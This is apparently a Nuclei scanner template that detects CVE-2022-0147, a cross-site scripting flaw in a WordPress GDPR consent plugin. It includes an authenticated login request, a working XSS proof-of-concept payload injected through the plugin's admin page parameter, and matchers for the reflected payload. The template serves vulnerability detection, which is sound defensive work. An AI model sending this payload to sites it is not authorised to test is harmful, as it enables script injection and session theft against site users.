http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - x=\' onanimationstart=alert(document.domain) style=animation-name:rotation x'
    - toplevel_page_wp-gdpr-compliance
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=wp-gdpr-compliance&x=%27+onanimationstart%3Dalert%28document.domain%29+style%3Danimation-name%3Arotation+x  HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-0147
info:
  author: 8arthur
  classification:
    cpe: cpe:2.3:a:cookieinformation:wp-gdpr-compliance:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0147
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.81823
    epss-score: 0.01702
  description: 'WordPress Cookie Information/Free GDPR Consent Solution plugin prior
    to 2.0.8 contains a cross-site scripting vulnerability via the admin dashboard.
    An attacker can inject arbitrary script in the browser of an unsuspecting user
    in the context of the affected site. This can allow the attacker to steal cookie-based
    authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: wp-gdpr-compliance
    vendor: cookieinformation
    verified: true
  name: WordPress Cookie Information/Free GDPR Consent Solution <2.0.8 - Cross-Site
    Scripting
  reference:
  - https://wpscan.com/vulnerability/2c735365-69c0-4652-b48e-c4a192dfe0d1
  - https://wordpress.org/plugins/wp-gdpr-compliance/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0147
  - https://plugins.trac.wordpress.org/changeset/2681371
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update to the latest version of the WordPress Cookie Information/Free
    GDPR Consent Solution plugin (2.0.8 or higher) to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2022,cve,wordpress,xss,wp,authenticated,wp-plugin,wp-gdpr-compliance,wpscan,cookieinformation,vuln
